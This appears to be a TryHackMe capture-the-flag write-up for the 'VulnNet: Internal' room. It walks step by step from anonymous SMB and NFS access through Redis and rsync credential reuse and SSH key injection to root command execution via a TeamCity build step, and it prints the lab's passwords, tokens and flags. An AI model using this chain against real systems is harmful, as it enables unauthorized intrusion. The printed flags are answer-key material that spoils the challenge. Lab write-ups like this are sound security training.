# VulnNet: Internal — TryHackMe Writeup

> **Difficulty:** Medium  
> **OS:** Linux (Ubuntu 20.04)  
> **Author's Note:** This room covers enumeration of multiple services, chaining credentials across protocols, and privilege escalation through a misconfigured CI/CD server.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [SMB — Service Flag](#smb--service-flag)
3. [NFS — Redis Credentials](#nfs--redis-credentials)
4. [Redis — Internal Flag](#redis--internal-flag)
5. [Rsync — User Flag](#rsync--user-flag)
6. [Initial Access via SSH](#initial-access-via-ssh)
7. [Privilege Escalation — TeamCity](#privilege-escalation--teamcity)
8. [Flags Summary](#flags-summary)

---

## Reconnaissance

A full port scan reveals a rich attack surface:

```bash
nmap -sV -sC -p- <TARGET_IP>
```

**Key open ports:**

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 |
| 111 | rpcbind | NFS-related |
| 139/445 | SMB | Samba smbd 4.6.2 |
| 873 | Rsync | Protocol version 31 |
| 2049 | NFS | Network File System |
| 6379 | Redis | Key-value store |
| 9090 | zeus-admin | Filtered externally |
| 45721 | Java RMI | — |

The presence of SMB, NFS, Rsync, and Redis all on the same box suggests a service-chaining challenge where credentials discovered in one service unlock access to the next.

---

## SMB — Service Flag

### Enumeration

Listing available SMB shares with anonymous (null session) access:

```bash
smbclient -L //<TARGET_IP> -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
shares          Disk      VulnNet Business Shares
IPC$            IPC       IPC Service
```

### Exploitation

The `shares` share allows anonymous read access — no password required:

```bash
smbclient //<TARGET_IP>/shares -N
```

Downloading all files recursively:

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

This retrieves three files:

- `temp/services.txt` — **contains the service flag**
- `data/data.txt` — a note about data purging
- `data/business-req.txt` — a business document (no useful info)

```bash
cat temp/services.txt
```

> **services.txt flag:** `THM{0a09d51e488f5fa105d8d866a497440a}`

---

## NFS — Redis Credentials

### Enumeration

Checking exported NFS shares:

```bash
showmount -e <TARGET_IP>
```

```
Export list for <TARGET_IP>:
/opt/conf *
```

The `/opt/conf` directory is exported to everyone (`*`).

### Mounting and Exploring

```bash
mkdir /tmp/nfs
mount -t nfs <TARGET_IP>:/opt/conf /tmp/nfs -o nolock
find /tmp/nfs -type f
```

Among the configuration files, we find the critical one:

```
/tmp/nfs/redis/redis.conf
```

### Extracting the Redis Password

```bash
grep "requirepass" /tmp/nfs/redis/redis.conf
```

```
requirepass "B65Hx562F@ggAZ@F"
```

We now have the Redis authentication password.

---

## Redis — Internal Flag

### Connecting with Credentials

```bash
redis-cli -h <TARGET_IP> -a 'B65Hx562F@ggAZ@F'
```

### Enumerating Keys

```
KEYS *
```

```
1) "authlist"
2) "int"
3) "internal flag"
4) "marketlist"
5) "tmp"
```

### Retrieving the Internal Flag

```
GET "internal flag"
```

> **Internal flag:** `THM{ff8e518addbbddb74531a724236a8221}`

### Discovering Rsync Credentials

The `authlist` key contains Base64-encoded data:

```
LRANGE "authlist" 0 -1
```

Decoding:

```bash
echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
```

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

Credentials for Rsync:
- **User:** `rsync-connect`
- **Password:** `Hcg3HP67@TW@Bc72v`

---

## Rsync — User Flag

### Listing Modules

```bash
rsync --list-only rsync://<TARGET_IP>
```

```
files           Necessary home interaction
```

### Downloading Files with Credentials

```bash
rsync -av rsync://rsync-connect@<TARGET_IP>/files/ /tmp/rsync_loot/
```

Enter the password `Hcg3HP67@TW@Bc72v` when prompted.

### Finding the User Flag

```bash
find /tmp/rsync_loot -name "user.txt"
cat /tmp/rsync_loot/sys-internal/user.txt
```

> **user.txt flag:** `THM{da7c20696831f253e0afaca8b83c07ab}`

---

## Initial Access via SSH

The Rsync module provides write access to the `sys-internal` user's home directory. We can upload our own SSH public key.

### Generating and Uploading an SSH Key

```bash
ssh-keygen -t rsa -f /tmp/ctf_key -N ""
mkdir -p /tmp/rsync_loot/sys-internal/.ssh
cp /tmp/ctf_key.pub /tmp/rsync_loot/sys-internal/.ssh/authorized_keys

rsync -av /tmp/rsync_loot/sys-internal/.ssh/authorized_keys \
  rsync://rsync-connect@<TARGET_IP>/files/sys-internal/.ssh/authorized_keys
```

### Connecting

```bash
ssh -i /tmp/ctf_key sys-internal@<TARGET_IP>
```

```
sys-internal@vulnnet:~$ whoami
sys-internal
```

We now have a shell as `sys-internal`.

---

## Privilege Escalation — TeamCity

### Discovery

Enumerating running processes reveals **TeamCity** running as `root`:

```bash
ps aux | grep -i team
```

```
root  724  ... sh teamcity-server.sh _start_internal
root  731  ... sh /TeamCity/bin/teamcity-server-restarter.sh run
root 1274  ... java ... org.apache.catalina.startup.Bootstrap start
root 1478  ... java ... jetbrains.buildServer.agent.Launcher ...
root 1618  ... java ... jetbrains.buildServer.agent.AgentMain ...
```

Both the **server** and the **build agent** run as `root`. This means any build step executed through TeamCity will run with root privileges.

Checking listening ports confirms TeamCity's web interface is bound to localhost:

```bash
ss -tlnp | grep 8111
```

```
LISTEN  0  100  [::ffff:127.0.0.1]:8111  *:*
```

### Retrieving the Super User Token

The TeamCity Super User authentication token is stored in the server logs:

```bash
grep -i "Super user authentication token" /TeamCity/logs/catalina.out | tail -1
```

```
[TeamCity] Super user authentication token: 4162185526425378652
```

> **Note:** The token found in Redis (`b441ad5edaf61a90da0969cb9a2b4079`) was an old/invalid token. Always use the latest token from the server logs.

### SSH Port Forwarding

Since TeamCity only listens on localhost, we use SSH port forwarding to access it from our browser:

```bash
ssh -L 8111:127.0.0.1:8111 -i /tmp/ctf_key sys-internal@<TARGET_IP>
```

Now open `http://localhost:8111` in your browser.

### Logging In

1. Click **"Log in as Super user"** at the bottom of the login page
2. Enter the token: `4162185526425378652`

### Executing Commands as Root

1. **Create Project** → Manually → Name: `Root`
2. **Create Build Configuration** → Name: `Flag`
3. **Build Steps** → **Add build step**
4. **Runner type:** Command Line
5. **Script content:** `cat /root/root.txt`
6. **Save** → **Run**
7. Open the **Build Log** → expand **Step 1/1: Command Line**

> **root.txt flag:** `THM{e8996faea46df09dba5676dd271c60bd}`

---

## Flags Summary

| Flag | Value | Vector |
|------|-------|--------|
| services.txt | `THM{0a09d51e488f5fa105d8d866a497440a}` | SMB anonymous access |
| internal flag | `THM{ff8e518addbbddb74531a724236a8221}` | Redis (password from NFS) |
| user.txt | `THM{da7c20696831f253e0afaca8b83c07ab}` | Rsync (credentials from Redis) |
| root.txt | `THM{e8996faea46df09dba5676dd271c60bd}` | TeamCity RCE as root |

---

## Attack Chain Diagram

```
SMB (anonymous) ──► services.txt flag
        │
NFS (anonymous) ──► redis.conf ──► Redis password
        │
Redis (authenticated) ──► internal flag
        │                  └──► Base64 Rsync credentials
        │
Rsync (authenticated) ──► user.txt flag
        │                  └──► Write SSH key to sys-internal home
        │
SSH (sys-internal) ──► Local enumeration
        │               └──► TeamCity running as root on port 8111
        │
TeamCity (Super User token from logs)
        └──► Build step: cat /root/root.txt ──► root.txt flag
```

---

## Key Takeaways

1. **Service Chaining:** Each service leaked credentials for the next, forming a chain from anonymous access to root.
2. **NFS Misconfigurations:** Exporting `/opt/conf` to `*` exposed sensitive configuration files including Redis credentials.
3. **Redis Data Exposure:** Storing Base64-encoded credentials in Redis keys is a common CTF pattern but also reflects real-world risks of unsecured data stores.
4. **Writable Rsync Modules:** Write access to a user's home directory allows SSH key injection — a classic lateral movement technique.
5. **CI/CD as Privilege Escalation:** TeamCity (or Jenkins, GitLab CI, etc.) running as root is a critical misconfiguration. Build agents should always run with minimal privileges.
6. **SSH Port Forwarding:** Essential technique for accessing internal services that only bind to localhost.
